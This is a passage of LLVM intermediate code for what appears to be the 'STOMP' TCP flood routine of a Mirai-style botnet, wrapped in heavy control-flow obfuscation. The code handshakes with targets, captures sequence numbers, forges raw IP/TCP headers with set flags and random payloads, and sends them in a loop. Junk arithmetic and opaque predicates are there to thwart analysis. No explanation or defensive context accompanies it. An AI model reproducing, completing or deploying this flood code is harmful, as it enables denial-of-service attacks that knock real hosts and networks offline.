  %742 = call zeroext i16 @htons(i16 zeroext %741) #7
  %743 = zext i16 %742 to i32
  %744 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %745 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %744, i32 0, i32 3
  store i32 %743, i32* %745, align 4
  %746 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %747 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %746, i32 0, i32 6
  store i16 0, i16* %747, align 4
  %748 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %749 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %750 = bitcast %struct.tcphdr* %749 to i8*
  %751 = load i32, i32* %24, align 4
  %752 = sext i32 %751 to i64
  %753 = add i64 20, %752
  %754 = trunc i64 %753 to i16
  %755 = call zeroext i16 @htons(i16 zeroext %754) #7
  %756 = load i32, i32* %24, align 4
  %757 = sext i32 %756 to i64
  %758 = add i64 20, %757
  %759 = trunc i64 %758 to i32
  %760 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %748, i8* %750, i16 zeroext %755, i32 %759)
  %761 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %762 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %761, i32 0, i32 6
  store i16 %760, i16* %762, align 4
  %763 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %764 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %763, i32 0, i32 1
  %765 = load i16, i16* %764, align 2
  %766 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %767 = load i32, i32* %9, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %766, i64 %768
  %770 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %769, i32 0, i32 0
  %771 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %770, i32 0, i32 1
  store i16 %765, i16* %771, align 2
  %772 = load i32, i32* %10, align 4
  %773 = load i8*, i8** %39, align 8
  %774 = load i32, i32* %24, align 4
  %775 = sext i32 %774 to i64
  %776 = add i64 40, %775
  %777 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %778 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %779 = load i32, i32* %9, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %778, i64 %780
  %782 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %781, i32 0, i32 0
  %783 = bitcast %struct.sockaddr_in* %782 to %struct.sockaddr*
  store %struct.sockaddr* %783, %struct.sockaddr** %777, align 8
  %784 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %785 = load %struct.sockaddr*, %struct.sockaddr** %784, align 8
  %786 = call i64 @sendto(i32 %772, i8* %773, i64 %776, i32 16384, %struct.sockaddr* %785, i32 16)
  %787 = load i32, i32* @x.29
  %788 = load i32, i32* @y.30
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBBpart2325, label %originalBB291alteredBB

originalBBpart2325:                               ; preds = %originalBB291
  br label %795

; <label>:795:                                    ; preds = %originalBBpart2325
  %796 = load i32, i32* %9, align 4
  %797 = add nsw i32 %796, 1
  store i32 %797, i32* %9, align 4
  br label %657

; <label>:798:                                    ; preds = %657
  %799 = load i32, i32* @x.29
  %800 = load i32, i32* @y.30
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBB327, label %originalBB327alteredBB

originalBB327:                                    ; preds = %originalBB327alteredBB, %798
  %807 = load i32, i32* @x.29
  %808 = load i32, i32* @y.30
  %809 = sub i32 %807, 1
  %810 = mul i32 %807, %809
  %811 = urem i32 %810, 2
  %812 = icmp eq i32 %811, 0
  %813 = icmp slt i32 %808, 10
  %814 = or i1 %812, %813
  br i1 %814, label %originalBBpart2329, label %originalBB327alteredBB

originalBBpart2329:                               ; preds = %originalBB327
  br label %656

; <label>:815:                                    ; preds = %originalBBpart224, %111, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %114
  store i32 0, i32* %9, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %140
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %206
  %816 = call i32 @rand_next()
  %_ = sub i32 %816, 65535
  %gen = mul i32 %_, 65535
  %_7 = sub i32 0, %816
  %gen8 = add i32 %_7, 65535
  %_9 = shl i32 %816, 65535
  %_10 = shl i32 %816, 65535
  %817 = and i32 %816, 65535
  %818 = trunc i32 %817 to i16
  %819 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %818, i16* %819, align 2
  br label %originalBB6

originalBB14alteredBB:                            ; preds = %originalBB14, %231
  %820 = load i32, i32* %26, align 4
  %821 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %822 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %822, %struct.sockaddr** %821, align 8
  %823 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %824 = load %struct.sockaddr*, %struct.sockaddr** %823, align 8
  %825 = call i32 @connect(i32 %820, %struct.sockaddr* %824, i32 16)
  %826 = call i64 @time(i64* null) #6
  store i64 %826, i64* %31, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %255
  store i32 16, i32* %29, align 4
  %827 = load i32, i32* %10, align 4
  %828 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %829 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %830 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %830, %struct.sockaddr** %829, align 8
  %831 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %832 = load %struct.sockaddr*, %struct.sockaddr** %831, align 8
  %833 = call i64 @recvfrom(i32 %827, i8* %828, i64 256, i32 16384, %struct.sockaddr* %832, i32* %29)
  %834 = trunc i64 %833 to i32
  store i32 %834, i32* %33, align 4
  %835 = load i32, i32* %33, align 4
  %836 = icmp eq i32 %835, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %282
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %331
  %837 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 4
  %839 = load i16, i16* %838, align 4
  %_27 = sub i16 %839, 12
  %gen28 = mul i16 %_27, 12
  %_29 = sub i16 0, %839
  %gen30 = add i16 %_29, 12
  %_31 = shl i16 %839, 12
  %_32 = shl i16 %839, 12
  %840 = lshr i16 %839, 12
  %_33 = sub i16 0, %840
  %gen34 = add i16 %_33, 1
  %_35 = sub i16 0, %840
  %gen36 = add i16 %_35, 1
  %841 = and i16 %840, 1
  %842 = zext i16 %841 to i32
  %843 = icmp ne i32 %842, 0
  br label %originalBB26

originalBB40alteredBB:                            ; preds = %originalBB40, %450
  %844 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %845 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %844, i32 0, i32 6
  store i8 6, i8* %845, align 1
  %846 = load i32, i32* @LOCAL_ADDR, align 4
  %847 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %848 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %847, i32 0, i32 8
  store i32 %846, i32* %848, align 4
  %849 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %850 = load i32, i32* %9, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %849, i64 %851
  %853 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %852, i32 0, i32 0
  %854 = load i32, i32* %853, align 4
  %855 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %856 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %855, i32 0, i32 9
  store i32 %854, i32* %856, align 4
  %857 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %858 = load i32, i32* %9, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %857, i64 %859
  %861 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %860, i32 0, i32 3
  %862 = load i16, i16* %861, align 4
  %863 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %864 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %863, i32 0, i32 0
  store i16 %862, i16* %864, align 4
  %865 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %866 = load i32, i32* %9, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %865, i64 %867
  %869 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %868, i32 0, i32 4
  %870 = load i16, i16* %869, align 2
  %871 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %872 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %871, i32 0, i32 1
  store i16 %870, i16* %872, align 2
  %873 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %874 = load i32, i32* %9, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %873, i64 %875
  %877 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %876, i32 0, i32 2
  %878 = load i32, i32* %877, align 4
  %879 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %880 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %879, i32 0, i32 2
  store i32 %878, i32* %880, align 4
  %881 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %882 = load i32, i32* %9, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %881, i64 %883
  %885 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %884, i32 0, i32 1
  %886 = load i32, i32* %885, align 4
  %887 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %888 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %887, i32 0, i32 3
  store i32 %886, i32* %888, align 4
  %889 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %890 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %889, i32 0, i32 4
  %891 = load i16, i16* %890, align 4
  %_41 = shl i16 %891, -241
  %_42 = sub i16 0, %891
  %gen43 = add i16 %_42, -241
  %892 = and i16 %891, -241
  %_44 = sub i16 %892, 128
  %gen45 = mul i16 %_44, 128
  %_46 = sub i16 %892, 128
  %gen47 = mul i16 %_46, 128
  %_48 = sub i16 %892, 128
  %gen49 = mul i16 %_48, 128
  %_50 = shl i16 %892, 128
  %_51 = sub i16 0, %892
  %gen52 = add i16 %_51, 128
  %_53 = sub i16 0, %892
  %gen54 = add i16 %_53, 128
  %_55 = sub i16 %892, 128
  %gen56 = mul i16 %_55, 128
  %893 = or i16 %892, 128
  store i16 %893, i16* %890, align 4
  %894 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %895 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %894, i32 0, i32 4
  %896 = load i16, i16* %895, align 4
  %_57 = sub i16 %896, -257
  %gen58 = mul i16 %_57, -257
  %_59 = sub i16 0, %896
  %gen60 = add i16 %_59, -257
  %_61 = sub i16 0, %896
  %gen62 = add i16 %_61, -257
  %_63 = sub i16 0, %896
  %gen64 = add i16 %_63, -257
  %_65 = sub i16 %896, -257
  %gen66 = mul i16 %_65, -257
  %_67 = sub i16 %896, -257
  %gen68 = mul i16 %_67, -257
  %_69 = sub i16 %896, -257
  %gen70 = mul i16 %_69, -257
  %897 = and i16 %896, -257
  %_71 = sub i16 %897, 256
  %gen72 = mul i16 %_71, 256
  %_73 = sub i16 %897, 256
  %gen74 = mul i16 %_73, 256
  %_75 = shl i16 %897, 256
  %_76 = sub i16 0, %897
  %gen77 = add i16 %_76, 256
  %_78 = sub i16 0, %897
  %gen79 = add i16 %_78, 256
  %898 = or i16 %897, 256
  store i16 %898, i16* %895, align 4
  %899 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %900 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %899, i32 0, i32 4
  %901 = load i16, i16* %900, align 4
  %_80 = sub i16 %901, -4097
  %gen81 = mul i16 %_80, -4097
  %_82 = sub i16 0, %901
  %gen83 = add i16 %_82, -4097
  %_84 = sub i16 0, %901
  %gen85 = add i16 %_84, -4097
  %_86 = sub i16 0, %901
  %gen87 = add i16 %_86, -4097
  %_88 = sub i16 0, %901
  %gen89 = add i16 %_88, -4097
  %_90 = shl i16 %901, -4097
  %902 = and i16 %901, -4097
  %_91 = shl i16 %902, 4096
  %_92 = sub i16 %902, 4096
  %gen93 = mul i16 %_92, 4096
  %_94 = shl i16 %902, 4096
  %_95 = shl i16 %902, 4096
  %_96 = shl i16 %902, 4096
  %903 = or i16 %902, 4096
  store i16 %903, i16* %900, align 4
  %904 = call i32 @rand_next()
  %_97 = sub i32 0, %904
  %gen98 = add i32 %_97, 65535
  %_99 = sub i32 %904, 65535
  %gen100 = mul i32 %_99, 65535
  %_101 = shl i32 %904, 65535
  %_102 = sub i32 %904, 65535
  %gen103 = mul i32 %_102, 65535
  %_104 = sub i32 %904, 65535
  %gen105 = mul i32 %_104, 65535
  %_106 = sub i32 0, %904
  %gen107 = add i32 %_106, 65535
  %_108 = sub i32 %904, 65535
  %gen109 = mul i32 %_108, 65535
  %905 = and i32 %904, 65535
  %906 = trunc i32 %905 to i16
  %907 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %908 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %907, i32 0, i32 5
  store i16 %906, i16* %908, align 2
  %909 = load i8, i8* %18, align 1
  %910 = sext i8 %909 to i16
  %911 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %912 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %911, i32 0, i32 4
  %913 = load i16, i16* %912, align 4
  %_110 = sub i16 0, %910
  %gen111 = add i16 %_110, 1
  %_112 = sub i16 %910, 1
  %gen113 = mul i16 %_112, 1
  %_114 = sub i16 0, %910
  %gen115 = add i16 %_114, 1
  %_116 = sub i16 0, %910
  %gen117 = add i16 %_116, 1
  %_118 = sub i16 0, %910
  %gen119 = add i16 %_118, 1
  %_120 = shl i16 %910, 1
  %914 = and i16 %910, 1
  %_121 = sub i16 %914, 13
  %gen122 = mul i16 %_121, 13
  %_123 = shl i16 %914, 13
  %_124 = sub i16 %914, 13
  %gen125 = mul i16 %_124, 13
  %_126 = shl i16 %914, 13
  %_127 = sub i16 0, %914
  %gen128 = add i16 %_127, 13
  %_129 = shl i16 %914, 13
  %_130 = sub i16 %914, 13
  %gen131 = mul i16 %_130, 13
  %915 = shl i16 %914, 13
  %_132 = sub i16 %913, -8193
  %gen133 = mul i16 %_132, -8193
  %_134 = shl i16 %913, -8193
  %_135 = shl i16 %913, -8193
  %_136 = sub i16 %913, -8193
  %gen137 = mul i16 %_136, -8193
  %916 = and i16 %913, -8193
  %_138 = sub i16 %916, %915
  %gen139 = mul i16 %_138, %915
  %_140 = sub i16 0, %916
  %gen141 = add i16 %_140, %915
  %_142 = sub i16 %916, %915
  %gen143 = mul i16 %_142, %915
  %_144 = sub i16 0, %916
  %gen145 = add i16 %_144, %915
  %917 = or i16 %916, %915
  store i16 %917, i16* %912, align 4
  %918 = load i8, i8* %19, align 1
  %919 = sext i8 %918 to i16
  %920 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %921 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %920, i32 0, i32 4
  %922 = load i16, i16* %921, align 4
  %_146 = shl i16 %919, 1
  %923 = and i16 %919, 1
  %_147 = shl i16 %923, 12
  %_148 = sub i16 0, %923
  %gen149 = add i16 %_148, 12
  %_150 = shl i16 %923, 12
  %_151 = sub i16 %923, 12
  %gen152 = mul i16 %_151, 12
  %_153 = sub i16 %923, 12
  %gen154 = mul i16 %_153, 12
  %_155 = sub i16 %923, 12
  %gen156 = mul i16 %_155, 12
  %924 = shl i16 %923, 12
  %_157 = shl i16 %922, -4097
  %_158 = shl i16 %922, -4097
  %925 = and i16 %922, -4097
  %_159 = shl i16 %925, %924
  %926 = or i16 %925, %924
  store i16 %926, i16* %921, align 4
  %927 = load i8, i8* %20, align 1
  %928 = sext i8 %927 to i16
  %929 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %930 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %929, i32 0, i32 4
  %931 = load i16, i16* %930, align 4
  %_160 = sub i16 0, %928
  %gen161 = add i16 %_160, 1
  %_162 = sub i16 0, %928
  %gen163 = add i16 %_162, 1
  %932 = and i16 %928, 1
  %_164 = sub i16 %932, 11
  %gen165 = mul i16 %_164, 11
  %_166 = shl i16 %932, 11
  %_167 = sub i16 %932, 11
  %gen168 = mul i16 %_167, 11
  %_169 = sub i16 0, %932
  %gen170 = add i16 %_169, 11
  %_171 = sub i16 %932, 11
  %gen172 = mul i16 %_171, 11
  %_173 = sub i16 0, %932
  %gen174 = add i16 %_173, 11
  %_175 = shl i16 %932, 11
  %933 = shl i16 %932, 11
  %_176 = sub i16 0, %931
  %gen177 = add i16 %_176, -2049
  %_178 = shl i16 %931, -2049
  %_179 = sub i16 %931, -2049
  %gen180 = mul i16 %_179, -2049
  %_181 = sub i16 %931, -2049
  %gen182 = mul i16 %_181, -2049
  %_183 = sub i16 %931, -2049
  %gen184 = mul i16 %_183, -2049
  %934 = and i16 %931, -2049
  %_185 = shl i16 %934, %933
  %_186 = sub i16 0, %934
  %gen187 = add i16 %_186, %933
  %935 = or i16 %934, %933
  store i16 %935, i16* %930, align 4
  %936 = load i8, i8* %21, align 1
  %937 = sext i8 %936 to i16
  %938 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %939 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %938, i32 0, i32 4
  %940 = load i16, i16* %939, align 4
  %_188 = sub i16 %937, 1
  %gen189 = mul i16 %_188, 1
  %_190 = sub i16 %937, 1
  %gen191 = mul i16 %_190, 1
  %_192 = sub i16 %937, 1
  %gen193 = mul i16 %_192, 1
  %941 = and i16 %937, 1
  %_194 = sub i16 0, %941
  %gen195 = add i16 %_194, 10
  %_196 = shl i16 %941, 10
  %942 = shl i16 %941, 10
  %_197 = sub i16 0, %940
  %gen198 = add i16 %_197, -1025
  %_199 = sub i16 %940, -1025
  %gen200 = mul i16 %_199, -1025
  %_201 = sub i16 %940, -1025
  %gen202 = mul i16 %_201, -1025
  %_203 = shl i16 %940, -1025
  %943 = and i16 %940, -1025
  %_204 = sub i16 %943, %942
  %gen205 = mul i16 %_204, %942
  %_206 = sub i16 0, %943
  %gen207 = add i16 %_206, %942
  %_208 = shl i16 %943, %942
  %_209 = sub i16 %943, %942
  %gen210 = mul i16 %_209, %942
  %_211 = shl i16 %943, %942
  %_212 = sub i16 %943, %942
  %gen213 = mul i16 %_212, %942
  %_214 = sub i16 0, %943
  %gen215 = add i16 %_214, %942
  %944 = or i16 %943, %942
  store i16 %944, i16* %939, align 4
  %945 = load i8, i8* %22, align 1
  %946 = sext i8 %945 to i16
  %947 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %948 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %947, i32 0, i32 4
  %949 = load i16, i16* %948, align 4
  %_216 = sub i16 %946, 1
  %gen217 = mul i16 %_216, 1
  %_218 = sub i16 0, %946
  %gen219 = add i16 %_218, 1
  %_220 = sub i16 %946, 1
  %gen221 = mul i16 %_220, 1
  %_222 = sub i16 %946, 1
  %gen223 = mul i16 %_222, 1
  %950 = and i16 %946, 1
  %_224 = sub i16 %950, 9
  %gen225 = mul i16 %_224, 9
  %_226 = shl i16 %950, 9
  %_227 = sub i16 %950, 9
  %gen228 = mul i16 %_227, 9
  %_229 = shl i16 %950, 9
  %_230 = sub i16 %950, 9
  %gen231 = mul i16 %_230, 9
  %_232 = shl i16 %950, 9
  %_233 = shl i16 %950, 9
  %951 = shl i16 %950, 9
  %_234 = sub i16 %949, -513
  %gen235 = mul i16 %_234, -513
  %952 = and i16 %949, -513
  %_236 = sub i16 %952, %951
  %gen237 = mul i16 %_236, %951
  %_238 = sub i16 %952, %951
  %gen239 = mul i16 %_238, %951
  %_240 = sub i16 %952, %951
  %gen241 = mul i16 %_240, %951
  %_242 = sub i16 0, %952
  %gen243 = add i16 %_242, %951
  %953 = or i16 %952, %951
  store i16 %953, i16* %948, align 4
  %954 = load i8, i8* %23, align 1
  %955 = sext i8 %954 to i16
  %956 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %957 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %956, i32 0, i32 4
  %958 = load i16, i16* %957, align 4
  %_244 = sub i16 %955, 1
  %gen245 = mul i16 %_244, 1
  %_246 = shl i16 %955, 1
  %_247 = sub i16 0, %955
  %gen248 = add i16 %_247, 1
  %_249 = sub i16 0, %955
  %gen250 = add i16 %_249, 1
  %959 = and i16 %955, 1
  %_251 = sub i16 0, %959
  %gen252 = add i16 %_251, 8
  %_253 = shl i16 %959, 8
  %_254 = sub i16 %959, 8
  %gen255 = mul i16 %_254, 8
  %_256 = sub i16 0, %959
  %gen257 = add i16 %_256, 8
  %_258 = sub i16 0, %959
  %gen259 = add i16 %_258, 8
  %_260 = sub i16 0, %959
  %gen261 = add i16 %_260, 8
  %_262 = sub i16 %959, 8
  %gen263 = mul i16 %_262, 8
  %960 = shl i16 %959, 8
  %_264 = sub i16 0, %958
  %gen265 = add i16 %_264, -257
  %_266 = sub i16 0, %958
  %gen267 = add i16 %_266, -257
  %961 = and i16 %958, -257
  %_268 = sub i16 %961, %960
  %gen269 = mul i16 %_268, %960
  %_270 = sub i16 0, %961
  %gen271 = add i16 %_270, %960
  %_272 = sub i16 0, %961
  %gen273 = add i16 %_272, %960
  %_274 = sub i16 0, %961
  %gen275 = add i16 %_274, %960
  %962 = or i16 %961, %960
  store i16 %962, i16* %957, align 4
  %963 = load i8*, i8** %38, align 8
  %964 = load i32, i32* %24, align 4
  call void @rand_str(i8* %963, i32 %964)
  br label %originalBB40

originalBB279alteredBB:                           ; preds = %originalBB279, %607
  br label %originalBB279

originalBB283alteredBB:                           ; preds = %originalBB283, %634
  br label %originalBB283

originalBB287alteredBB:                           ; preds = %originalBB287, %662
  %965 = load i8**, i8*** %12, align 8
  %966 = load i32, i32* %9, align 4
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds i8*, i8** %965, i64 %967
  %969 = load i8*, i8** %968, align 8
  store i8* %969, i8** %39, align 8
  %970 = load i8*, i8** %39, align 8
  %971 = bitcast i8* %970 to %struct.iphdr*
  store %struct.iphdr* %971, %struct.iphdr** %40, align 8
  %972 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %973 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %972, i64 1
  %974 = bitcast %struct.iphdr* %973 to %struct.tcphdr*
  store %struct.tcphdr* %974, %struct.tcphdr** %41, align 8
  %975 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %976 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %975, i64 1
  %977 = bitcast %struct.tcphdr* %976 to i8*
  store i8* %977, i8** %42, align 8
  %978 = load i16, i16* %14, align 2
  %979 = zext i16 %978 to i32
  %980 = icmp eq i32 %979, 65535
  br label %originalBB287

originalBB291alteredBB:                           ; preds = %originalBB291, %707
  %981 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %982 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %981, i32 0, i32 7
  store i16 0, i16* %982, align 2
  %983 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %984 = bitcast %struct.iphdr* %983 to i16*
  %985 = call zeroext i16 @checksum_generic(i16* %984, i32 20)
  %986 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %987 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %986, i32 0, i32 7
  store i16 %985, i16* %987, align 2
  %988 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %989 = load i32, i32* %9, align 4
  %990 = sext i32 %989 to i64
  %991 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %988, i64 %990
  %992 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %991, i32 0, i32 1
  %993 = load i32, i32* %992, align 4
  %_292 = shl i32 %993, 1
  %_293 = shl i32 %993, 1
  %_294 = shl i32 %993, 1
  %_295 = shl i32 %993, 1
  %_296 = sub i32 0, %993
  %gen297 = add i32 %_296, 1
  %_298 = shl i32 %993, 1
  %994 = add i32 %993, 1
  store i32 %994, i32* %992, align 4
  %995 = trunc i32 %993 to i16
  %996 = call zeroext i16 @htons(i16 zeroext %995) #7
  %997 = zext i16 %996 to i32
  %998 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %999 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %998, i32 0, i32 2
  store i32 %997, i32* %999, align 4
  %1000 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1001 = load i32, i32* %9, align 4
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1000, i64 %1002
  %1004 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1003, i32 0, i32 2
  %1005 = load i32, i32* %1004, align 4
  %1006 = trunc i32 %1005 to i16
  %1007 = call zeroext i16 @htons(i16 zeroext %1006) #7
  %1008 = zext i16 %1007 to i32
  %1009 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1010 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1009, i32 0, i32 3
  store i32 %1008, i32* %1010, align 4
  %1011 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1012 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1011, i32 0, i32 6
  store i16 0, i16* %1012, align 4
  %1013 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1014 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1015 = bitcast %struct.tcphdr* %1014 to i8*
  %1016 = load i32, i32* %24, align 4
  %1017 = sext i32 %1016 to i64
  %_299 = sub i64 20, %1017
  %gen300 = mul i64 %_299, %1017
  %_301 = sub i64 0, 20
  %gen302 = add i64 %_301, %1017
  %_303 = sub i64 20, %1017
  %gen304 = mul i64 %_303, %1017
  %1018 = add i64 20, %1017
  %1019 = trunc i64 %1018 to i16
  %1020 = call zeroext i16 @htons(i16 zeroext %1019) #7
  %1021 = load i32, i32* %24, align 4
  %1022 = sext i32 %1021 to i64
  %_305 = shl i64 20, %1022
  %_306 = shl i64 20, %1022
  %_307 = shl i64 20, %1022
  %_308 = sub i64 0, 20
  %gen309 = add i64 %_308, %1022
  %_310 = shl i64 20, %1022
  %_311 = sub i64 20, %1022
  %gen312 = mul i64 %_311, %1022
  %_313 = shl i64 20, %1022
  %_314 = sub i64 0, 20
  %gen315 = add i64 %_314, %1022
  %1023 = add i64 20, %1022
  %1024 = trunc i64 %1023 to i32
  %1025 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1013, i8* %1015, i16 zeroext %1020, i32 %1024)
  %1026 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1027 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1026, i32 0, i32 6
  store i16 %1025, i16* %1027, align 4
  %1028 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1029 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1028, i32 0, i32 1
  %1030 = load i16, i16* %1029, align 2
  %1031 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1032 = load i32, i32* %9, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1031, i64 %1033
  %1035 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1034, i32 0, i32 0
  %1036 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1035, i32 0, i32 1
  store i16 %1030, i16* %1036, align 2
  %1037 = load i32, i32* %10, align 4
  %1038 = load i8*, i8** %39, align 8
  %1039 = load i32, i32* %24, align 4
  %1040 = sext i32 %1039 to i64
  %_316 = sub i64 40, %1040
  %gen317 = mul i64 %_316, %1040
  %_318 = sub i64 40, %1040
  %gen319 = mul i64 %_318, %1040
  %_320 = sub i64 0, 40
  %gen321 = add i64 %_320, %1040
  %_322 = sub i64 40, %1040
  %gen323 = mul i64 %_322, %1040
  %1041 = add i64 40, %1040
  %1042 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %1043 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1044 = load i32, i32* %9, align 4
